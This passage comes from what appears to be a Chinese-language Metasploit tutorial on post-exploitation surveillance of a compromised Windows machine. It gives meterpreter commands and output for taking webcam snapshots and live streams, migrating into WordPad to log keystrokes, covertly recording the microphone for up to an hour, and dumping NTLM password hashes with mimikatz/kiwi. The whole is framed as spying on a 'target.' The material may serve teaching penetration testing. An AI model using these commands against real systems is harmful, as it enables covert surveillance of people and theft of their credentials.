
被分配了编号 1。如果存在多个网络摄像头，我们则需要使用下一条命令中的编号，但由于该命令默认为 1，因此此处无需操作。

在这种情况下，我们可以通过输入以下命令指示网络摄像头进行快照：`meterpreter > webcam_snap`。当我们输入该命令时，meterpreter 会拍摄一张照片并将其显示在我们的桌面屏幕上。

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_410_0.png)

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_410_1.png)

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_411_0.png)

现在，我们拥有了一张对手坐在其电脑后的照片！

请注意，它拍摄了快照，并将快照保存在 `/root` 目录下，使用了一个随机名称（hzMVZRTv.jpeg）并添加了 .jpeg 扩展名。

### 传输网络摄像头视频流

在某些情况下，我们的上级可能希望获取目标计算机所在房间的活动视频流。让我们前往该地点的另一台计算机，利用漏洞并传输视频流。执行此操作的命令是：`meterpreter > webcam_stream`

该命令将在您的系统上打开默认浏览器（在此例中为 Mozilla Firefox），并开始将摄像头视频实时传输到浏览器中，效果如下所示。

### 键盘记录器或如何查看每次击键

作为间谍，我们可能希望捕获目标输入的所有击键。这可能揭示秘密和机密计划、密码及其他信息。你可能熟悉硬件键盘记录器。硬件键盘记录器通常物理放置在目标系统上，然后记录键盘的所有击键，例如在亚马逊上销售的这种键盘记录器。

Metasploit 中的键盘记录器略有不同。

它是一种软件键盘记录器。优点是可以远程安装。缺点是它一次只能记录一个进程的击键（理论上，你可以拥有多个 meterpreter，同时记录多个进程的击键，例如 MS Word、记事本、Chrome 和 Firefox）。

为了使用我们的键盘记录器，我们需要决定要捕获击键的目标进程，然后将 meterpreter 迁移（移动）到该进程。

第一步是在 meterpreter 提示符下输入 `ps`。与 Linux 中一样，这将列出目标系统上运行的所有进程。

`meterpreter > ps`

![](img/ae0bf680ecd2ea15f7b4172e1f4a3412_412_0.png)

```
1256 480 svchost.exe x64 0 NT AUTHORITY\LOCAL SERVICE C:\Windows\System32\svchost.exe
1360 480 sspsvc.exe x64 0 NT AUTHORITY\NETWORK SERVICE C:\Windows\System32\sspsvc.exe
1624 480 svchost.exe x64 0 NT AUTHORITY\NETWORK SERVICE C:\Windows\System32\svchost.exe
1940 1732 explorer.exe x64 1 OTW-PC\OTW C:\Windows\explorer.exe
2016 480 taskhost.exe x64 1 OTW-PC\OTW C:\Windows\System32\taskhost.exe
2044 480 svchost.exe x64 0 NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe
2104 864 wuaucilt.exe x64 1 OTW-PC\OTW C:\Windows\System32\wuaucilt.exe
2168 336 conhost.exe x64 1 OTW-PC\OTW C:\Windows\System32\conhost.exe
2296 1940 wordpad.exe x64 1 OTW-PC\OTW C:\Program Files\Windows NT\Accessories\wordpad.exe
2616 1940 ServiceHost2.exe x86 1 OTW-PC\OTW C:\Users\OTW\Desktop\ServiceHost2.exe
2924 792 audiodg.exe x64 0
```

```
meterpreter > migrate 2296
[*] Migrating from 2616 to 2296...
[*] Migration completed successfully.
```

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```

如上所示，目标 Windows 7 系统上运行的所有进程均以 PID、PPID、进程名称、架构、会话、用户和路径列出。

如果我们稍微向下扫描此列表，可以看到一个用于 Wordpad 的进程。

高亮的进程——2296——正在运行 Wordpad，这是 Windows 内置的字处理程序。通常，除非用户在写东西，否则 WordPad 不会处于打开状态。让我们尝试记录该进程的击键。

为此，我们需要将 meterpreter 移动或迁移到该进程。

`meterpreter > migrate 2296`

既然我们已经将 meterpreter 植入该进程中，就可以启动键盘记录器。正如你可能预期的那样，该命令是 `keyscan_start`。

`meterpreter > keyscan_start`

```
meterpreter > keyscan_dump
Dumping captured keystrokes...
<Shift>Dear <Shift>General<<Shift><Shift>::<CR>
<CR>
<Shift>It is finally time to destroy those <Shift>American capitalist doggs. <Shift>Prepare to launch the missiles,
but first secure my final shipment of <Shift>Hostess <Shift>Twinkies.<CR>
<Shift>Your <Shift>Fearless and <Shift>Omniscient <Shift> Leader,<CR>
<Shift>Kim <Shift>Jung <Shift>Un
```

```
meterpreter > record_mic
[*] Starting...
[*] Stopped
Audio saved to: /root/HEQxmFEB.wav
```

当我们准备好检索击键时，只需使用 `keyscan_dump` 命令即可。

`meterpreter > keyscan_dump`

看来我们的目标有一些险恶的计划！幸好我们捕获了他们所有的击键！

# 将目标系统用作监听“窃听器”

作为间谍，除了从摄像头拍摄快照或传输视频流外，你可能还想启用其计算机上的内置麦克风，以收听目标的对话。在黑客历史中，已经出现了一些正是如此做的恶意软件，包括 Flame 和 Duqu。

再一次，meterpreter 具有内置命令来执行此操作，`record_mic`。

`meterpreter > record_mic`

如你所见，当我们运行此命令时，它会记录计算机附近的环境声音，并将它们保存在 root 用户目录下，使用随机文件名的 .wav（音频）文件中。

此 meterpreter 命令有许多有用的选项。例如：

- `-d`：录制秒数（默认 = 1 秒）
- `-f`：.wav 文件路径。
- `-p`：自动播放捕获的音频，默认值为“true”。

现在，我们可以构建一个有用的命令，录制十秒音频，创建一个名为 spyaudio.wav 的 .wav 文件，并自动通过你的系统扬声器回放音频。

`meterpreter > record_mic -d 10 -f spyaudio.wav -p true`

```
meterpreter > record_mic -d 10 -f spyaudio.wav -p true
[*] Starting...
[*] Stopped
Audio saved to: /root/spyaudio.wav
```

当然，我们只需更改 -d 选项后的值，就可以将此窃听器启用任意秒数。因此，例如，如果我们想要捕获一小时的音频，我们可以将该值更改为 3600：`meterpreter > record_mic -d 3600 -f spyaudio.wav -p true`

### Mimikatz

在某些情况下，`hashdump` 命令无法用于检索本地系统上的密码哈希值。

在这种情况下，我们有另一个工具可以抓取密码。此工具 mimikatz 由 Benjamin Delpy，也被称为 gentilkiwi，开发。

Mimikatz 能够从 RAM 中提取和解析信息。我们寻求的最重要信息之一是本地系统上的密码哈希值。当系统启动时，它将这些哈希值加载到 RAM 中，并使用像 mimikatz 这样的工具，我们可以提取它们。Mimikatz 曾是历史上一些重大黑客攻击的一部分，包括 NotPetya 和 Blackenergy3 ([Blackenergy 3 恶意软件解剖](https://www.hackers-arise.com/post/2018-10-10/scada-hacking-anatomy-of-a-scada-malware-blackenergy-3))。

第一步是从 meterpreter 提示符加载 kiwi（如果你的目标是 32 位系统，你将加载 mimikatz）。

`meterpreter > load kiwi`

```
meterpreter > load kiwi
Loading extension kiwi...
..#####. mimikatz 2.1.1 20180925 (x86/windows)
.## ^ ##. "A La Vie, A L'Amour"
## / \ ## /** Benjamine DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \\ / ## > http://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####'' > http://pingcastle.com / http://mysmartlogon.com ***/
[!] Loaded x86 Kiwi on an x64 architecture.

Success.
```

一旦 kiwi 加载完成，我们只需运行以下命令即可从运行系统的 SAM 文件中提取哈希值：`meterpreter > mimikatz_command -f samdump::hashes`

```
meterpreter > mimikatz command -f samdump::hashes
Ordinateur : WIN-EVJBGP133FK
BootKey : 4aeaaf316b41045c2313c72063dfb6245

Rid : 500
User : Administrator
LM :
NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0

Rid : 501
User : Guest
LM :
NTLM :

Rid : 1000
User : OTW
LM :
NTLM : 8846f7eae8fb117ad06bdd830b7586c

Rid : 1001
User : Hocker
LM :
NTLM : 5e7599f673df11d5c5c4d950f5bf0157

Rid : 1002
User : hacker2
LM :
NTLM : 32ed87bdb5fdc5e9cba88547376818d4
```

```
meterpreter > run arp_scanner -r 192.168.0.0/24
[*] ARP Scanning 192.168.0.0/24
[*] IP: 192.168.0.101 MAC 00:0c:29:e9:a7:e4
[*] IP: 192.168.0.115 MAC 00:0c:29:99:c9:41
[*] IP: 192.168.0.255 MAC 00:0c:29:e9:a7:e4
```

如上所示，mimikatz 能够从未系统中 RAM 提取所有用户账户并为我们显示出来。要了解 mimikatz 的众多功能，请访问 https://www.hackers-arise.com

